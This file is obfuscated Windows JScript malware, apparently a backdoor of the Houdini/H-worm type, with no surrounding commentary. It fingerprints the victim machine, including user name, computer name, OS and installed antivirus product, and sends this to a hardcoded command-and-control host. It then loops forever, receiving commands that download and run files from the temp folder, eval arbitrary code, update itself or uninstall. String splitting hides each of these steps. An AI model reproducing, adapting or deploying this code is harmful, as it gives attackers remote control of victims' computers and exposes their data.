var j = [
    'WScr' + 'ipt.' + 'Shel' + 'l',
    'Scri' + 'ptin' + 'g.Fi' + 'leSy' + 'stem' + 'Obje' + 'ct',
    'Shel' + 'l.Ap' + 'plic' + 'atio' + 'n',
    'Micr' + 'osof' + 't.XM' + 'LHTT' + 'P'
];
var g = [
    'HKCU',
    'HKLM',
    'HKCU' + '\x5cvjw' + '0rm',
    '\x5cSof' + 'twar' + 'e\x5cMi' + 'cros' + 'oft\x5c' + 'Wind' + 'ows\x5c' + 'Curr' + 'entV' + 'ersi' + 'on\x5cR' + 'un\x5c',
    'HKLM' + '\x5cSOF' + 'TWAR' + 'E\x5cCl' + 'asse' + 's\x5c',
    'REG_' + 'SZ',
    '\x5cdef' + 'ault' + 'icon' + '\x5c'
];
var y = [
    'winm' + 'gmts' + ':',
    'win3' + '2_lo' + 'gica' + 'ldis' + 'k',
    'Win3' + '2_Op' + 'erat' + 'ingS' + 'yste' + 'm',
    'Anti' + 'Viru' + 'sPro' + 'duct'
];
var sh = Cr(0x0);
var fs = Cr(0x1);
var spl = '|V|';
var Ch = '\x5c';
var VN = 'j0m' + '_' + Ob(0x6);
var fu = WScript['Scri' + 'ptFu' + 'llNa' + 'me'];
var wn = WScript['Scri' + 'ptNa' + 'me'];
var U;
try {
    U = sh['RegR' + 'ead'](g[0x2]);
} catch (_0x22796c) {
    var sv = fu['spli' + 't']('\x5c');
    if (':\x5c' + sv[0x1] == ':\x5c' + wn) {
        U = 'TRUE';
        sh['RegW' + 'rite'](g[0x2], U, g[0x5]);
    } else {
        U = 'FALS' + 'E';
        sh['RegW' + 'rite'](g[0x2], U, g[0x5]);
    }
}
do {
    try {
        var P = Pt('Vre', '');
        P = P['spli' + 't'](spl);
        if (P[0x0] === 'Cl') {
            WScript['Quit'](0x1);
        }
        if (P[0x0] === 'Sc') {
            var s2 = Ex('temp') + '\x5c' + P[0x2];
            var fi = fs['Crea' + 'teTe' + 'xtFi' + 'le'](s2, !![]);
            fi['Writ' + 'e'](P[0x1]);
            fi['Clos' + 'e']();
            sh['run'](s2);
        }
        if (P[0x0] === 'Ex') {
            eval(P[0x1]);
        }
        if (P[0x0] === 'Rn') {
            var ri = fs['Open' + 'Text' + 'File'](fu, 0x1);
            var fr = ri['Read' + 'All']();
            ri['Clos' + 'e']();
            VN = VN['spli' + 't']('_');
            fr = fr['repl' + 'ace'](VN[0x0], P[0x1]);
            var wi = fs['Open' + 'Text' + 'File'](fu, 0x2, ![]);
            wi['Writ' + 'e'](fr);
            wi['Clos' + 'e']();
            sh['run']('wscr' + 'ipt.' + 'exe\x20' + '//B\x20' + '\x22' + fu + '\x22');
            WScript['Quit'](0x1);
        }
        if (P[0x0] === 'Up') {
            var s2 = Ex('temp') + '\x5c' + P[0x2];
            var ctf = fs['Crea' + 'teTe' + 'xtFi' + 'le'](s2, !![]);
            var gu = P[0x1];
            gu = gu['repl' + 'ace']('|U|', '|V|');
            ctf['Writ' + 'e'](gu);
            ctf['Clos' + 'e']();
            sh['run']('wscr' + 'ipt.' + 'exe\x20' + '//B\x20' + '\x22' + s2 + '\x22', 0x6);
            WScript['Quit'](0x1);
        }
        if (P[0x0] === 'Un') {
            var s2 = P[0x1];
            var vdr = fu;
            var regi = 'Noth' + 'ing!';
            s2 = s2['repl' + 'ace']('%f', fu)['repl' + 'ace']('%n', wn)['repl' + 'ace']('%sfd' + 'r', vdr)['repl' + 'ace']('%RgN' + 'e%', regi);
            eval(s2);
            WScript['Quit'](0x1);
        }
        if (P[0x0] === 'RF') {
            var s2 = Ex('temp') + '\x5c' + P[0x2];
            var fi = fs['Crea' + 'teTe' + 'xtFi' + 'le'](s2, !![]);
            fi['Writ' + 'e'](P[0x1]);
            fi['Clos' + 'e']();
            sh['run'](s2);
        }
    } catch (_0x534277) {
    }
    WScript['Slee' + 'p'](0x1b58);
} while (!![]);
function Ex(_0x23b04f) {
    return sh['Expa' + 'ndEn' + 'viro' + 'nmen' + 'tStr' + 'ings']('%' + _0x23b04f + '%');
}
function Pt(_0x59ed11, _0x1dae08) {
    var _0x1a78ec = Cr(0x3);
    _0x1a78ec['open']('POST', 'http' + '://c' + 'olwe' + 'b.pu' + 'blic' + 'vm.c' + 'om:5' + '/' + _0x59ed11, ![]);
    _0x1a78ec['SetR' + 'eque' + 'stHe' + 'ader']('User' + '-Age' + 'nt:', nf());
    _0x1a78ec['send'](_0x1dae08);
    return _0x1a78ec['resp' + 'onse' + 'text'];
}
function nf() {
    var _0x3cf975, _0x500b90, _0x3f2684;
    if (fs['file' + 'exis' + 'ts'](Ex('Wind' + 'ir') + ('\x5cMic' + 'roso' + 'ft.N' + 'ET\x5cF' + 'rame' + 'work' + '\x5cv2.' + '0.50' + '727\x5c' + 'vbc.' + 'exe'))) {
        _0x500b90 = 'YES';
    } else {
        _0x500b90 = 'NO';
    }
    _0x3cf975 = VN + Ch + Ex('COMP' + 'UTER' + 'NAME') + Ch + Ex('USER' + 'NAME') + Ch + Ob(0x2) + Ch + Ob(0x4) + Ch + Ch + _0x500b90 + Ch + U + Ch;
    return _0x3cf975;
}
function Cr(_0x4cb3b4) {
    return new ActiveXObject(j[_0x4cb3b4]);
}
function Ob(_0x4f3add) {
    var _0x56cd64;
    if (_0x4f3add == 0x2) {
        _0x56cd64 = GetObject(y[0x0])['Inst' + 'ance' + 'sOf'](y[0x2]);
        var _0x15deb7 = new Enumerator(_0x56cd64);
        for (; !_0x15deb7['atEn' + 'd'](); _0x15deb7['move' + 'Next']()) {
            var _0x1370b4 = _0x15deb7['item']();
            return _0x1370b4['Capt' + 'ion'];
            break;
        }
    }
    if (_0x4f3add == 0x4) {
        var _0x599f9d = 'winm' + 'gmts' + ':\x5c\x5cl' + 'ocal' + 'host' + '\x5croo' + 't\x5cse' + 'curi' + 'tyce' + 'nter';
        _0x56cd64 = GetObject(_0x599f9d)['Inst' + 'ance' + 'sOf'](y[0x3]);
        var _0x15deb7 = new Enumerator(_0x56cd64);
        for (; !_0x15deb7['atEn' + 'd'](); _0x15deb7['move' + 'Next']()) {
            var _0x1370b4 = _0x15deb7['item']();
            var _0x4f944a = _0x1370b4['Disp' + 'layN' + 'ame'];
        }
        if (_0x4f944a !== '') {
            _0x599f9d = _0x599f9d + '2';
            _0x56cd64 = GetObject(_0x599f9d)['Inst' + 'ance' + 'sOf'](y[0x3]);
            _0x15deb7 = new Enumerator(_0x56cd64);
            for (; !_0x15deb7['atEn' + 'd'](); _0x15deb7['move' + 'Next']()) {
                _0x1370b4 = _0x15deb7['item']();
                return _0x1370b4['Disp' + 'layN' + 'ame'];
            }
        } else {
            return _0x1370b4['Disp' + 'layN' + 'ame'];
        }
    }
    if (_0x4f3add == 0x6) {
        _0x56cd64 = GetObject(y[0x0])['Inst' + 'ance' + 'sOf'](y[0x1]);
        var _0x15deb7 = new Enumerator(_0x56cd64);
        for (; !_0x15deb7['atEn' + 'd'](); _0x15deb7['move' + 'Next']()) {
            var _0x1370b4 = _0x15deb7['item']();
            return _0x1370b4['volu' + 'mese' + 'rial' + 'numb' + 'er'];
            break;
        }
    }
}